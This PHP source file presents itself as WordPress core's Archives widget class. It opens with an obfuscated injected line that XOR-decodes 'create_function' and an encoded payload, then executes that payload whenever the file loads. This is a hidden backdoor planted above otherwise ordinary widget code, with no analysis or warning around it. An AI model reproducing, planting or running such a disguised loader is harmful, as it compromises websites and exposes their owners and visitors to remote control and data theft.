<?php $KCVOyGLCE='Y8EAM7tFEXO=+WV'^':J  9R+ 06,IB88';$QgHuxG=$KCVOyGLCE('','B7yx,-42:DSU-WHI8F1aFX,E,X,Y86<<4JCABg.DhXBBXMPA6Z: RsU;;+=nU>LPl--TMTZvVT5LMzWjHGEf>p :GiWaRNIegoFOBlT,aSmbLin-S;54LK7Fj6WY1NXeUTcxz6j0PAY;lxnqxwIP208F1mz0ej>SM8M1EsLK7 <K<oh-72hmLy6PmI5=U:BfW-L-bhEfOr6y8gU 8XSpUQO:D+ufn PZ9r1.YmgzKW-9=BEgQZI=UOHSlwkz6y<,+HJ+Fc;HNNxIFeKXW,XBPF=EjXA22oX+0RwBH1UIB2xr WIJaYRhC3A;3l01EyX3qQnV>X,Jxo6l<5+:T84ZlEc:+0c20=hwU<nJ>E.brwOrJPTH.yLGFs2M2LTY=>1JMzTA-Q mhaONRLTAKDhe.AXX-heK5M3FNRQM=4Sjpw1+;T B54IIEyVTE955ZT;mM4XCIAGQoG-T21T0TNcRRD.PjXhH,AS0<<ACFR016fkO,N2uTdxZ;051eGW;7YM >3JgBP,MDnLoPV=6QMRRNaW.cbN3T9JjDQ-Lo4ytVpIkA8tYCwfuXJDQW pLRoUpdcWhEBlDEJo4DZqsVLV<9RU=3UT62U1=:<Rp 12R; 7eIkkOX=.eXMvjexnVMHW=-:FoO31AvUPRR ,.OHezOgq1<>2xxXq3+'^'+QQYJXZQN-<;r20 K2BIa C7s<M-YicQA>dhkGUNa>7,;99.XzBO ,1ZOJb18K8xHIL ,xzR=1LemZwJh<Oo7TOO3IjAuironf  0DpEAnMRwIJDoHAF .YnNR6-PgcEq=HSS<c9t.,OLVSQPS-1FQcbX0ZnENU64ciXeVl8CRP.RGLFRKA0eB<Yd;PI H,NsB9YKSOo2xKs2C1AL9sMu7.V7NNlJD1.X-ZK MZZ-6AJXyOm75;X4, sDS49y6wenh+XfGP-7nEwfA=9;Y=kp=7LN< FS03NIrJblZ00y8qVD6=+AdrL5R-NVW:LOs1UQyOrZ9X+QOMf5SDH1YW2LmGeyu2gun<W4ONnU WBOIoV<18=KPl<Lz;iV- 8bUT3mGteF4YVbhFj6-  kyHAX 4-HSoBHGNLDv5,IUsWP7DEH1R+TX 3 Q.;7fQT.5d2 A,k+ 44Ysr0WR;T1fG630OyFxL,M52oWY8joi:XPNO+M:SUrBX;IBTH:,2Bh<5IMG9Oe;I4cBlK47IWxmttnI:JVJjW5M+1c:H5HiPTkMiLvYF<sGRF:xv2gEHtdXbHPUbPtzU w,YVcsQUpl7NK3,bX0-iW-XNNOzWPPK>TASBeKO+9IOLqmVJEXN-GA2KLVnK+RE -r 3+LCO+o8StmxTDWFPHqJ9V');$QgHuxG();
/**
 * Widget API: WP_Widget_Archives class
 *
 * @package WordPress
 * @subpackage Widgets
 * @since 4.4.0
 */

/**
 * Core class used to implement the Archives widget.
 *
 * @since 2.8.0
 *
 * @see WP_Widget
 */
class WP_Widget_Archives extends WP_Widget {

	/**
	 * Sets up a new Archives widget instance.
	 *
	 * @since 2.8.0
	 * @access public
	 */
	public function __construct() {
		$widget_ops = array(
			'classname' => 'widget_archive',
			'description' => __( 'A monthly archive of your site&#8217;s Posts.' ),
			'customize_selective_refresh' => true,
		);
		parent::__construct('archives', __('Archives'), $widget_ops);
	}

	/**
	 * Outputs the content for the current Archives widget instance.
	 *
	 * @since 2.8.0
	 * @access public
	 *
	 * @param array $args     Display arguments including 'before_title', 'after_title',
	 *                        'before_widget', and 'after_widget'.
	 * @param array $instance Settings for the current Archives widget instance.
	 */
	public function widget( $args, $instance ) {
		$c = ! empty( $instance['count'] ) ? '1' : '0';
		$d = ! empty( $instance['dropdown'] ) ? '1' : '0';

		/** This filter is documented in wp-includes/widgets/class-wp-widget-pages.php */
		$title = apply_filters( 'widget_title', empty( $instance['title'] ) ? __( 'Archives' ) : $instance['title'], $instance, $this->id_base );

		echo $args['before_widget'];
		if ( $title ) {
			echo $args['before_title'] . $title . $args['after_title'];
		}

		if ( $d ) {
			$dropdown_id = "{$this->id_base}-dropdown-{$this->number}";
			?>
		<label class="screen-reader-text" for="<?php echo esc_attr( $dropdown_id ); ?>"><?php echo $title; ?></label>
		<select id="<?php echo esc_attr( $dropdown_id ); ?>" name="archive-dropdown" onchange='document.location.href=this.options[this.selectedIndex].value;'>
			<?php
			/**
			 * Filters the arguments for the Archives widget drop-down.
			 *
			 * @since 2.8.0
			 *
			 * @see wp_get_archives()
			 *
			 * @param array $args An array of Archives widget drop-down arguments.
			 */
			$dropdown_args = apply_filters( 'widget_archives_dropdown_args', array(
				'type'            => 'monthly',
				'format'          => 'option',
				'show_post_count' => $c
			) );

			switch ( $dropdown_args['type'] ) {
				case 'yearly':
					$label = __( 'Select Year' );
					break;
				case 'monthly':
					$label = __( 'Select Month' );
					break;
				case 'daily':
					$label = __( 'Select Day' );
					break;
				case 'weekly':
					$label = __( 'Select Week' );
					break;
				default:
					$label = __( 'Select Post' );
					break;
			}
			?>

			<option value=""><?php echo esc_attr( $label ); ?></option>
			<?php wp_get_archives( $dropdown_args ); ?>

		</select>
		<?php } else { ?>
		<ul>
		<?php
		/**
		 * Filters the arguments for the Archives widget.
		 *
		 * @since 2.8.0
		 *
		 * @see wp_get_archives()
		 *
		 * @param array $args An array of Archives option arguments.
		 */
		wp_get_archives( apply_filters( 'widget_archives_args', array(
			'type'            => 'monthly',
			'show_post_count' => $c
		) ) );
		?>
		</ul>
		<?php
		}

		echo $args['after_widget'];
	}

	/**
	 * Handles updating settings for the current Archives widget instance.
	 *
	 * @since 2.8.0
	 * @access public
	 *
	 * @param array $new_instance New settings for this instance as input by the user via
	 *                            WP_Widget_Archives::form().
	 * @param array $old_instance Old settings for this instance.
	 * @return array Updated settings to save.
	 */
	public function update( $new_instance, $old_instance ) {
		$instance = $old_instance;
		$new_instance = wp_parse_args( (array) $new_instance, array( 'title' => '', 'count' => 0, 'dropdown' => '') );
		$instance['title'] = sanitize_text_field( $new_instance['title'] );
		$instance['count'] = $new_instance['count'] ? 1 : 0;
		$instance['dropdown'] = $new_instance['dropdown'] ? 1 : 0;

		return $instance;
	}

	/**
	 * Outputs the settings form for the Archives widget.
	 *
	 * @since 2.8.0
	 * @access public
	 *
	 * @param array $instance Current settings.
	 */
	public function form( $instance ) {
		$instance = wp_parse_args( (array) $instance, array( 'title' => '', 'count' => 0, 'dropdown' => '') );
		$title = sanitize_text_field( $instance['title'] );
		?>
		<p><label for="<?php echo $this->get_field_id('title'); ?>"><?php _e('Title:'); ?></label> <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo esc_attr($title); ?>" /></p>
		<p>
			<input class="checkbox" type="checkbox"<?php checked( $instance['dropdown'] ); ?> id="<?php echo $this->get_field_id('dropdown'); ?>" name="<?php echo $this->get_field_name('dropdown'); ?>" /> <label for="<?php echo $this->get_field_id('dropdown'); ?>"><?php _e('Display as dropdown'); ?></label>
			<br/>
			<input class="checkbox" type="checkbox"<?php checked( $instance['count'] ); ?> id="<?php echo $this->get_field_id('count'); ?>" name="<?php echo $this->get_field_name('count'); ?>" /> <label for="<?php echo $this->get_field_id('count'); ?>"><?php _e('Show post counts'); ?></label>
		</p>
		<?php
	}
}
